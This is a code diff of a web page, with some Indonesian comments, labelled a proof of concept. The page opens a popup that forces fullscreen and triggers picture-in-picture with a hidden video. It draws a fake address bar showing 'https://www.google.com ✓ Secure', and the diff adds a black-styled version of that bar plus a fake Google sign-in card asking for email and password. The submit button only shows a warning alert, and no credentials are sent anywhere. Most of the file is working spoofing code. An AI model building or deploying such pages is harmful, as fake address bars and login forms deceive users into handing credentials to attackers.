@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🎬 PiP + Fullscreen Window Opener</title>
+    <title>🎬 PiP + Fullscreen Window Opener (Dark Mode)</title>
     <style>
         * {
             margin: 0;
@@ -58,6 +58,11 @@
             padding: 4px 12px;
             font-size: 9px;
             font-weight: bold;
+        }
+        .badge.dark {
+            border-color: #333;
+            background: #111;
+            color: #888;
         }
         .preview-box {
             background: #00000066;
@@ -145,18 +150,34 @@
             font-size: 8px;
             opacity: 0.4;
         }
+        .dark-preview {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 8px 16px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 11px;
+            color: #888;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
 <div class="container">
-    <h1>🎬 PiP + FULLSCREEN</h1>
-    <div class="sub">Open New Window with PiP & Fullscreen Mode</div>
+    <h1>🎬 PiP + FULLSCREEN (DARK)</h1>
+    <div class="sub">Open New Window with Dark PiP & Fullscreen Mode</div>
     
     <div class="badge-group">
         <span class="badge">🔴 PiP MODE</span>
         <span class="badge">🟡 FULLSCREEN</span>
         <span class="badge">🟢 NEW WINDOW</span>
-        <span class="badge">⚡ AUTO-PLAY VIDEO</span>
+        <span class="badge dark">⬛ DARK ADDRESS BAR</span>
+    </div>
+    
+    <div class="dark-preview">
+        ⬛ FAKE ADDRESS BAR: HITAM TULUS (#000000)<br>
+        <span style="color:#666;">Text: https://www.google.com 🔒 Secure</span>
     </div>
     
     <div class="preview-box">
@@ -170,27 +191,27 @@
         🔴 IDLE
     </div>
     
-    <button id="openBtn">🚀 OPEN PiP + FULLSCREEN WINDOW 🚀</button>
+    <button id="openBtn">🚀 OPEN DARK PiP + FULLSCREEN 🚀</button>
     
     <div class="warning">
-        ⚠️ Browser will open new window with PiP video + Fullscreen mode<br>
+        ⚠️ Fake address bar berwarna HITAM (#000000) seperti dark mode<br>
         Click the button to start
     </div>
     
     <div class="log-box" id="logBox">
-        <div class="log-entry">[SYSTEM] PiP + Fullscreen Window Opener Ready</div>
+        <div class="log-entry">[SYSTEM] Dark PiP + Fullscreen Window Opener Ready</div>
+        <div class="log-entry">[SYSTEM] Fake address bar: HITAM TULUS</div>
         <div class="log-entry">[SYSTEM] Click button to open new window</div>
     </div>
     
     <footer>
-        PiP + Fullscreen | Auto-play video | New Window | macOS/Windows/Linux
+        PiP + Fullscreen | Dark Mode Fake Address Bar | Auto-play video
     </footer>
 </div>
 
 <script>
     let pipWindow = null;
     let isRunning = false;
-    let videoStream = null;
 
     function addLog(msg, type = 'info') {
         let logBox = document.getElementById('logBox');
@@ -219,7 +240,7 @@
         return `<!DOCTYPE html>
         <html>
         <head>
-            <title>🎬 PiP + Fullscreen Window</title>
+            <title>🎬 PiP + Fullscreen Window (Dark)</title>
             <meta charset="UTF-8">
             <style>
                 * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -253,36 +274,64 @@
                     font-size: 12px;
                     font-family: monospace;
                 }
+                /* ===== FAKE ADDRESS BAR - HITAM TULUS ===== */
                 .fake-url-bar {
                     position: fixed;
                     top: 0;
                     left: 0;
                     width: 100%;
                     height: 50px;
-                    background: #fff;
-                    border-bottom: 1px solid #ccc;
+                    background: #000000;
+                    border-bottom: 1px solid #1a1a1a;
                     display: flex;
                     align-items: center;
-                    padding: 0 20px;
+                    padding: 0 16px;
                     z-index: 999999;
-                    font-family: monospace;
-                    color: #1a73e8;
-                }
-                .fake-url-bar span {
+                    font-family: 'SF Mono', monospace;
+                    color: #888888;
                     font-size: 12px;
-                    color: #5f6368;
+                    box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+                }
+                .fake-url-bar .lock {
+                    color: #666;
+                    margin-right: 10px;
+                    font-size: 14px;
+                }
+                .fake-url-bar .url {
+                    color: #aaaaaa;
+                    flex: 1;
+                    white-space: nowrap;
+                    overflow: hidden;
+                    text-overflow: ellipsis;
+                }
+                .fake-url-bar .url .domain {
+                    color: #ffffff;
+                    font-weight: 500;
+                }
+                .fake-url-bar .badge {
+                    background: #1a1a1a;
+                    color: #666;
+                    padding: 2px 8px;
+                    border-radius: 30px;
+                    font-size: 9px;
+                    border: 1px solid #222;
+                }
+                .fake-url-bar .secure {
+                    color: #4caf50;
+                    font-size: 10px;
                     margin-left: 10px;
                 }
+                /* ===== PIP BADGE ===== */
                 .pip-badge {
                     position: fixed;
                     top: 60px;
                     right: 20px;
                     background: #000000aa;
                     backdrop-filter: blur(10px);
-                    border: 1px solid #ff3b30;
+                    border: 1px solid #333;
                     border-radius: 12px;
                     padding: 8px 16px;
-                    color: #fff;
+                    color: #888;
                     font-size: 10px;
                     z-index: 999998;
                     font-family: monospace;
@@ -312,7 +361,7 @@
                     backdrop-filter: blur(10px);
                     padding: 12px 20px;
                     border-radius: 60px;
-                    border: 1px solid #ff3b30;
+                    border: 1px solid #333;
                 }
                 .controls button {
                     background: #ff3b30;
@@ -338,35 +387,132 @@
                     background: #ff3b30;
                     color: #fff;
                 }
+                .controls button.close-btn {
+                    background: #222;
+                    color: #888;
+                }
+                .controls button.close-btn:hover {
+                    background: #ff3b30;
+                    color: #fff;
+                }
+                /* ===== GOOGLE FAKE CARD ===== */
+                .google-card {
+                    background: #1a1a2e;
+                    border-radius: 16px;
+                    padding: 40px 32px;
+                    max-width: 400px;
+                    width: 100%;
+                    text-align: center;
+                    border: 1px solid #333;
+                    box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+                }
+                .google-card .logo {
+                    font-size: 52px;
+                    margin-bottom: 16px;
+                }
+                .google-card h2 {
+                    color: #fff;
+                    margin-bottom: 8px;
+                    font-weight: 400;
+                }
+                .google-card p {
+                    color: #888;
+                    font-size: 14px;
+                    margin-bottom: 24px;
+                }
+                .google-card input {
+                    width: 100%;
+                    padding: 14px;
+                    margin: 8px 0;
+                    background: #0a0a0f;
+                    border: 1px solid #333;
+                    border-radius: 8px;
+                    color: #fff;
+                    font-size: 14px;
+                }
+                .google-card input:focus {
+                    border-color: #1a73e8;
+                    outline: none;
+                }
+                .google-card input::placeholder {
+                    color: #555;
+                }
+                .google-card button {
+                    width: 100%;
+                    padding: 12px;
+                    background: #1a73e8;
+                    color: #fff;
+                    border: none;
+                    border-radius: 8px;
+                    font-size: 14px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    margin-top: 8px;
+                }
+                .google-card button:hover {
+                    background: #1664c4;
+                }
+                .google-card .warning {
+                    font-size: 10px;
+                    color: #555;
+                    margin-top: 16px;
+                }
+                .google-card .fake-url-display {
+                    background: #0a0a0f;
+                    padding: 6px 12px;
+                    border-radius: 20px;
+                    font-size: 11px;
+                    font-family: monospace;
+                    margin: 12px 0;
+                    color: #666;
+                    border: 1px solid #222;
+                }
             </style>
         </head>
         <body>
+            <!-- FAKE ADDRESS BAR - HITAM TULUS -->
             <div class="fake-url-bar">
-                🔒 https://www.google.com 🔒 Secure
-                <span>• PiP Active</span>
+                <span class="lock">🔒</span>
+                <span class="url">
+                    <span class="domain">https://www.google.com</span>
+                </span>
+                <span class="secure">✓ Secure</span>
+                <span class="badge">● PiP</span>
             </div>
             
             <div class="pip-badge">
-                <span class="dot"></span> PiP + Fullscreen Mode
+                <span class="dot"></span> PiP + Fullscreen Mode (Dark)
             </div>
             
-            <h1>🎬 PiP Video Player</h1>
-            <p class="status">⏺️ Playing in Picture-in-Picture + Fullscreen</p>
-            
-            <video id="pipVideo" autoplay loop muted playsinline>
-                <source src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAQxtZGF0AAAAPAAAAAoAAAAMAAABAAAAY3RkKwAAAAF/3CgjU3Ckf0UoIAAAAAAEAAADAgAAAAAAAQEAAAMCAAAAG1tb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb20AAAAA" type="video/mp4">
-            </video>
+            <div class="google-card">
+                <div class="logo">🔐</div>
+                <h2>Sign in</h2>
+                <p>to continue to Google</p>
+                <div class="fake-url-display">🔗 https://www.google.com</div>
+                <input type="text" placeholder="Email or phone" id="email">
+                <input type="password" placeholder="Password" id="pass">
+                <button onclick="alert('⚠️ POC - Do not enter real credentials!')">Next</button>
+                <p class="warning">⚠️ POC - Fake Google login page | Dark Mode</p>
+            </div>
             
             <div class="controls">
-                <button onclick="toggleFullscreen()">🖥️ Toggle Fullscreen</button>
-                <button class="pip-btn" onclick="togglePip()">🎬 Toggle PiP</button>
-                <button onclick="window.close()">✕ Close</button>
+                <button onclick="toggleFullscreen()">🖥️ Fullscreen</button>
+                <button class="pip-btn" onclick="togglePip()">🎬 PiP</button>
+                <button class="close-btn" onclick="window.close()">✕ Close</button>
             </div>
             
             <script>
-                let video = document.getElementById('pipVideo');
+                let video = document.createElement('video');
+                video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAQxtZGF0AAAAPAAAAAoAAAAMAAABAAAAY3RkKwAAAAF/3CgjU3Ckf0UoIAAAAAAEAAADAgAAAAAAAQEAAAMCAAAAG1tb29vb29vb29vb29vb29vb29vb29vb29vb29vb29vb20AAAAA';
+                video.muted = true;
+                video.autoplay = true;
+                video.loop = true;
+                video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px';
+                document.body.appendChild(video);
+                
                 let isFullscreen = false;
                 let isPip = false;
+                let pipWindow = null;
                 
                 // Auto fullscreen setelah 1 detik
                 setTimeout(() => {
@@ -388,23 +534,17 @@
                 
                 function toggleFullscreen() {
                     if (!document.fullscreenElement) {
-                        document.documentElement.requestFullscreen().then(() => {
-                            isFullscreen = true;
-                        }).catch(e => {});
+                        document.documentElement.requestFullscreen().then(() => isFullscreen = true).catch(()=>{});
                     } else {
-                        document.exitFullscreen().then(() => {
-                            isFullscreen = false;
-                        }).catch(e => {});
+                        document.exitFullscreen().then(() => isFullscreen = false).catch(()=>{});
                     }
                 }
                 
                 function togglePip() {
                     if (video && !isPip) {
-                        video.requestPictureInPicture().then(() => {
-                            isPip = true;
-                        }).catch(e => {});
+                        video.requestPictureInPicture().then(() => isPip = true).catch(()=>{});
                     } else if (video && isPip) {
-                        document.exitPictureInPicture().catch(e => {});
+                        document.exitPictureInPicture().catch(()=>{});
                         isPip = false;
                     }
                 }
@@ -420,8 +560,7 @@
                     document.querySelector('.pip-badge').innerHTML = '<span class="dot"></span> PiP Mode';
                 });
                 
-                console.log('%c🎬 PiP + Fullscreen Window Ready', 'color:#00ffaa;font-size:14px');
-                console.log('%cAuto-fullscreen in 1s | Auto-PiP in 1.5s', 'color:#ffcc00');
+                console.log('%c🎬 Dark PiP + Fullscreen Window Ready', 'color:#00ffaa;font-size:14px');
             <\/script>
         </body>
         </html>`;
@@ -436,43 +575,30 @@
         isRunning = true;
         document.getElementById('openBtn').disabled = true;
         document.getElementById('openBtn').innerHTML = '⏳ OPENING...';
-        updateStatus('⏳ OPENING PiP + FULLSCREEN', '#ffcc0022', '#ffcc00');
+        updateStatus('⏳ OPENING DARK PiP + FULLSCREEN', '#ffcc0022', '#ffcc00');
 
-        addLog('[START] Opening new window with PiP + Fullscreen...', 'pip');
+        addLog('[START] Opening new window with Dark PiP + Fullscreen...', 'pip');
 
-        // Create blob from HTML
         const htmlContent = getPipHTML();
         const blob = new Blob([htmlContent], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
         addLog('[BLOB] Created blob URL', 'success');
 
-        // Open new window
         const features = 'width=1024,height=768,menubar=yes,toolbar=yes,location=yes,status=yes,resizable=yes';
         pipWindow = window.open(blobUrl, '_blank', features);
 
         if (pipWindow && !pipWindow.closed) {
-            addLog('[WINDOW] ✅ New window opened!', 'success');
-            updateStatus('✅ PiP + FULLSCREEN ACTIVE', '#00ffaa22', '#00ffaa');
+            addLog('[WINDOW] ✅ New window opened with DARK fake address bar!', 'success');
+            updateStatus('✅ DARK PiP + FULLSCREEN ACTIVE', '#00ffaa22', '#00ffaa');
+            addLog('[PIP] Fake address bar: HITAM (#000000) dengan text abu-abu', 'pip');
 
-            // Wait for window to load then trigger PiP + Fullscreen
-            setTimeout(() => {
-                try {
-                    // The window will auto-trigger PiP + Fullscreen via its own script
-                    addLog('[PIP] Auto PiP + Fullscreen triggered in new window', 'pip');
-                } catch (e) {
-                    addLog(`[WINDOW] Error: ${e.message}`, 'pip');
-                }
-            }, 2000);
-
-            // Cleanup blob URL after window opens
             setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
 
-            // Reset button after delay
             setTimeout(() => {
                 isRunning = false;
                 document.getElementById('openBtn').disabled = false;
-                document.getElementById('openBtn').innerHTML = '🚀 OPEN PiP + FULLSCREEN WINDOW 🚀';
+                document.getElementById('openBtn').innerHTML = '🚀 OPEN DARK PiP + FULLSCREEN 🚀';
                 if (!pipWindow || pipWindow.closed) {
                     updateStatus('🔄 WINDOW CLOSED', '#ff3b3022', '#ff8888');
                 }
@@ -483,18 +609,16 @@
             updateStatus('❌ POPUP BLOCKED! Allow popups', '#ff3b3022', '#ff3b30');
             isRunning = false;
             document.getElementById('openBtn').disabled = false;
-            document.getElementById('openBtn').innerHTML = '🚀 OPEN PiP + FULLSCREEN WINDOW 🚀';
+            document.getElementById('openBtn').innerHTML = '🚀 OPEN DARK PiP + FULLSCREEN 🚀';
             URL.revokeObjectURL(blobUrl);
         }
     }
 
-    // Button handler
     document.getElementById('openBtn').addEventListener('click', openPipFullscreenWindow);
 
-    // Check if window is still open periodically
     setInterval(() => {
         if (pipWindow && pipWindow.closed) {
-            addLog('[WINDOW] PiP window was closed by user', 'pip');
+            addLog('[WINDOW] PiP window was closed', 'pip');
             pipWindow = null;
             if (!isRunning) {
                 updateStatus('🔄 WINDOW CLOSED', '#ff3b3022', '#ff8888');
@@ -502,8 +626,8 @@
         }
     }, 3000);
 
-    console.log('%c🎬 PiP + FULLSCREEN WINDOW OPENER READY', 'color:#00ffaa;font-size:14px');
-    console.log('%cClick button to open new window with PiP + Fullscreen', 'color:#ffcc00');
+    console.log('%c🎬 DARK PiP + FULLSCREEN WINDOW OPENER READY', 'color:#00ffaa;font-size:14px');
+    console.log('%cFake address bar: HITAM (#000000) dengan text abu-abu', 'color:#888');
 </script>
 </body>
 </html>
